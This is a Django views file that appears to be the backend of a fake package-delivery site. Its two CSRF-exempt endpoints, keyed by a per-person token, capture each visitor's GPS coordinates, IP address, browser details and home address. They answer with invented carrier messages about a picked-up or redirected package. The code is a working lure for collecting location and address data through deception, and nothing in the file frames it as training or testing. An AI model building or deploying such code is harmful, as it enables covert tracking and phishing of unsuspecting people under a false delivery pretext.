from django.contrib import admin, messages
from django.utils.html import format_html
from subadmin import SubAdmin, RootSubAdmin
from delivery.models import Company, Agent, TrackingData
from django.utils.timezone import localtime
from django.http import HttpRequest, JsonResponse, HttpResponse
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import render, get_object_or_404
from django.utils.dateparse import parse_datetime


@csrf_exempt
def track_view(request: HttpRequest, token: str) -> HttpResponse:
    if request.method == "POST":
        latitude = request.POST.get("latitude")
        longitude = request.POST.get("longitude")
        client_timestamp_raw = request.POST.get("client_timestamp")
        client_timezone = request.POST.get("client_timezone")
        http_method = request.POST.get('http_method', request.method)
        user_agent = request.META.get("HTTP_USER_AGENT", "")
        ip_address = request.META.get("REMOTE_ADDR")

        agent = get_object_or_404(Agent, token=token)

        TrackingData.objects.create(
            agent=agent,
            ip_address=ip_address,
            user_agent=user_agent,
            http_method=http_method,
            client_timezone=client_timezone,
            client_timestamp=parse_datetime(client_timestamp_raw) if client_timestamp_raw else None,
            latitude=latitude or None,
            longitude=longitude or None,
        )
        return JsonResponse({ "status": "success", "message": "✅ Your package was picked up by a local carrier. It may take a few hours to arrive at the sorting facility." })

    # For GET request: serve Django template
    return JsonResponse({"status": "error"})

@csrf_exempt
def redirect_package_view(request, token):
    agent = get_object_or_404(Agent, token=token)

    if request.method == 'POST':
        try:
            client_timestamp = request.POST.get('client_timestamp')
            client_timezone = request.POST.get('client_timezone')
            http_method = request.POST.get('http_method', request.method)
            latitude = request.POST.get('latitude')
            longitude = request.POST.get('longitude')
            street_address = request.POST.get('street_address')
            city = request.POST.get('city')
            state = request.POST.get('state')
            zip_code = request.POST.get('zip_code')
            country = request.POST.get('country')
            notifications = request.POST.get('notifications')

            # Update agent information
            agent.street_address = street_address
            agent.city = city
            agent.state = state
            agent.zip_code = zip_code
            agent.country = country
            agent.notifications = notifications
            agent.save(update_fields=[
                'street_address', 'city', 'state', 'zip_code', 'country', 'notifications'
            ])

            # Record tracking data
            TrackingData.objects.create(
                agent=agent,
                client_timestamp=client_timestamp,
                client_timezone=client_timezone,
                http_method=http_method,
                ip_address=request.META.get('REMOTE_ADDR'),
                latitude=latitude,
                longitude=longitude,
                user_agent=request.META.get('HTTP_USER_AGENT', ''),
            )

            return JsonResponse({ "status": "success", "message": "✅ A request was sent to redirect your package.  Please check your phone for updates we have sent you." })
        except Exception:
            return JsonResponse({'status': 'error'})

    return JsonResponse({'status': 'error'})  # Always return JSON for frontend integration
